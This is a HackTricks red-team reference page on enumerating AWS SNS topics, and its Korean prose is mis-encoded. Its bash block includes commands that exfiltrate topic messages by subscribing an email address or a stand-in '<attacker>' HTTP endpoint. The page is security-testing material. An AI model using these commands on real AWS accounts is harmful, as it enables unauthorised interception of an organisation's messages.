# AWS - SNS Enum

<details>

<summary><strong>htARTE (HackTricks AWS Red Team ì „ë¬¸ê°€)</strong>ë¥¼ í†µí•´ **ì œë¡œë¶€í„° ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸°**!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ **í•˜ê±°ë‚˜ **PDFë¡œ HackTricks ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [Discord ê·¸ë£¹](https://discord.gg/hRep4RUj7f)** ë˜ëŠ” [í…”ë ˆê·¸ë¨ ê·¸ë£¹](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ PRì„** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ì €ì¥ì†Œì— ì œì¶œí•˜ì„¸ìš”.

</details>

## SNS

Amazon Simple Notification Service (Amazon SNS)ì€ **ì™„ì „ ê´€ë¦¬í˜• ë©”ì‹œì§• ì„œë¹„ìŠ¤**ë¡œ ì„¤ëª…ë©ë‹ˆë‹¤. **ì‘ìš© í”„ë¡œê·¸ë¨ ê°„ í†µì‹ ** (A2A) ë° **ì‘ìš© í”„ë¡œê·¸ë¨-ì‚¬ìš©ì** (A2P) í†µì‹  ìœ í˜•ì„ ëª¨ë‘ ì§€ì›í•©ë‹ˆë‹¤.

A2A í†µì‹ ì˜ ì£¼ìš” ê¸°ëŠ¥ì—ëŠ” **ë°œí–‰/êµ¬ë… (pub/sub) ë©”ì»¤ë‹ˆì¦˜**ì´ í¬í•¨ë©ë‹ˆë‹¤. ì´ëŸ¬í•œ ë©”ì»¤ë‹ˆì¦˜ì€ **ì£¼ì œ**ë¥¼ ë„ì…í•˜ì—¬ **ê³ ì²˜ë¦¬ëŸ‰, í‘¸ì‹œ ê¸°ë°˜, ë‹¤ëŒ€ë‹¤ ë©”ì‹œì§•**ì„ ê°€ëŠ¥í•˜ê²Œ í•©ë‹ˆë‹¤. ì´ ê¸°ëŠ¥ì€ ë¶„ì‚° ì‹œìŠ¤í…œ, ë§ˆì´í¬ë¡œì„œë¹„ìŠ¤ ë° ì´ë²¤íŠ¸ ì£¼ë„ ì„œë²„ë¦¬ìŠ¤ ì•„í‚¤í…ì²˜ê°€ ê´€ë ¨ëœ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œ ë§¤ìš° ìœ ë¦¬í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ì£¼ì œë¥¼ í™œìš©í•˜ë©´ ë°œí–‰ì ì‹œìŠ¤í…œì´ ë©”ì‹œì§€ë¥¼ **ë‹¤ì–‘í•œ êµ¬ë…ì ì‹œìŠ¤í…œì— íš¨ìœ¨ì ìœ¼ë¡œ ë¶„ë°°**í•˜ì—¬ íŒ¬ì•„ì›ƒ ë©”ì‹œì§• íŒ¨í„´ì„ ìš©ì´í•˜ê²Œ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### **SQSì™€ì˜ ì°¨ì´ì **

**SQS**ëŠ” **í ê¸°ë°˜** ì„œë¹„ìŠ¤ë¡œ, ë©”ì‹œì§€ê°€ **ë‹¨ì¼ ì†Œë¹„ì**ì— ì˜í•´ ì²˜ë¦¬ë˜ë„ë¡ ë³´ì¥í•˜ëŠ” í¬ì¸íŠ¸ íˆ¬ í¬ì¸íŠ¸ í†µì‹ ì„ í—ˆìš©í•©ë‹ˆë‹¤. **ì ì–´ë„ í•œ ë²ˆì˜ ì „ë‹¬**ì„ ì œê³µí•˜ë©°, í‘œì¤€ ë° FIFO íë¥¼ ì§€ì›í•˜ë©° ì¬ì‹œë„ ë° ì§€ì—° ì²˜ë¦¬ë¥¼ ìœ„í•œ ë©”ì‹œì§€ ë³´ìœ ë¥¼ í—ˆìš©í•©ë‹ˆë‹¤.\
ë°˜ë©´ **SNS**ëŠ” **ë°œí–‰/êµ¬ë… ê¸°ë°˜ ì„œë¹„ìŠ¤**ë¡œ, ë©”ì‹œì§€ë¥¼ **ì—¬ëŸ¬ êµ¬ë…ì**ì— ë™ì‹œì— ë°©ì†¡í•˜ì—¬ **ì¼ëŒ€ë‹¤** í†µì‹ ì„ ê°€ëŠ¥í•˜ê²Œ í•©ë‹ˆë‹¤. **ì´ë©”ì¼, SMS, ëŒë‹¤ í•¨ìˆ˜ ë° HTTP/HTTPS**ì™€ ê°™ì€ ë‹¤ì–‘í•œ êµ¬ë… ì—”ë“œí¬ì¸íŠ¸ë¥¼ ì§€ì›í•˜ë©°, ëŒ€ìƒ ë©”ì‹œì§€ ì „ë‹¬ì„ ìœ„í•œ í•„í„°ë§ ë©”ì»¤ë‹ˆì¦˜ì„ ì œê³µí•©ë‹ˆë‹¤.\
ë‘ ì„œë¹„ìŠ¤ ëª¨ë‘ ë¶„ì‚° ì‹œìŠ¤í…œ êµ¬ì„± ìš”ì†Œ ê°„ì˜ ë””ì»¤í”Œë§ì„ ê°€ëŠ¥í•˜ê²Œ í•˜ì§€ë§Œ, SQSëŠ” ëŒ€ê¸°ì—´ í†µì‹ ì— ì¤‘ì ì„ ë‘ê³  ìˆìœ¼ë©°, SNSëŠ” ì´ë²¤íŠ¸ ì£¼ë„ ë° íŒ¬ì•„ì›ƒ í†µì‹  íŒ¨í„´ì— ì¤‘ì ì„ ë‘¡ë‹ˆë‹¤.

### **ì—´ê±°**
```bash
# Get topics & subscriptions
aws sns list-topics
aws sns list-subscriptions
aws sns list-subscriptions-by-topic --topic-arn <arn>

# Check privescs & post-exploitation
aws sns publish --region <region> \
--topic-arn "arn:aws:sns:us-west-2:123456789012:my-topic" \
--message file://message.txt

# Exfiltrate through email
## You will receive an email to confirm the subscription
aws sns subscribe --region <region> \
--topic-arn arn:aws:sns:us-west-2:123456789012:my-topic \
--protocol email \
--notification-endpoint my-email@example.com

# Exfiltrate through web server
## You will receive an initial request with a URL in the field "SubscribeURL"
## that you need to access to confirm the subscription
aws sns subscribe --region <region>\
--protocol http \
--notification-endpoint http://<attacker>/ \
--topic-arn <arn>
```
{% hint style="danger" %}
**ì£¼ì œê°€ FIFO ìœ í˜•ì¸ ê²½ìš°**ì—ëŠ” SQS í”„ë¡œí† ì½œì„ ì‚¬ìš©í•˜ëŠ” êµ¬ë…ìë§Œ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(HTTP ë˜ëŠ” HTTPSëŠ” ì‚¬ìš©í•  ìˆ˜ ì—†ìŒ).

ë˜í•œ `--topic-arn`ì— ì§€ì—­ì´ í¬í•¨ë˜ì–´ ìˆë”ë¼ë„ ì˜¬ë°”ë¥¸ ì§€ì—­ì„ **`--region`**ì— ì§€ì •í•´ì•¼ í•©ë‹ˆë‹¤. ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ ì•¡ì„¸ìŠ¤ ê¶Œí•œì´ ì—†ë‹¤ëŠ” ì˜¤ë¥˜ê°€ ë°œìƒí•  ìˆ˜ ìˆì§€ë§Œ ì‹¤ì œ ë¬¸ì œëŠ” ì§€ì—­ ì„¤ì •ì…ë‹ˆë‹¤.
{% endhint %}

#### ì¸ì¦ë˜ì§€ ì•Šì€ ì•¡ì„¸ìŠ¤

{% content-ref url="../aws-unauthenticated-enum-access/aws-sns-unauthenticated-enum.md" %}
[aws-sns-unauthenticated-enum.md](../aws-unauthenticated-enum-access/aws-sns-unauthenticated-enum.md)
{% endcontent-ref %}

#### ê¶Œí•œ ìƒìŠ¹

{% content-ref url="../aws-privilege-escalation/aws-sns-privesc.md" %}
[aws-sns-privesc.md](../aws-privilege-escalation/aws-sns-privesc.md)
{% endcontent-ref %}

#### í›„ë°˜ ê³µê²©

{% content-ref url="../aws-post-exploitation/aws-sns-post-exploitation.md" %}
[aws-sns-post-exploitation.md](../aws-post-exploitation/aws-sns-post-exploitation.md)
{% endcontent-ref %}

#### ì§€ì†ì„±

{% content-ref url="../aws-persistence/aws-sns-persistence.md" %}
[aws-sns-persistence.md](../aws-persistence/aws-sns-persistence.md)
{% endcontent-ref %}

## ì°¸ê³  ìë£Œ

* [https://aws.amazon.com/about-aws/whats-new/2022/01/amazon-sns-attribute-based-access-controls/](https://aws.amazon.com/about-aws/whats-new/2022/01/amazon-sns-attribute-based-access-controls/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì œë¡œë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ìš°ì„¸ìš”</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ë ¤ë©´** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ì…í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜** íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **HackTricks ë° HackTricks Cloud** ê¹ƒí—ˆë¸Œ ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
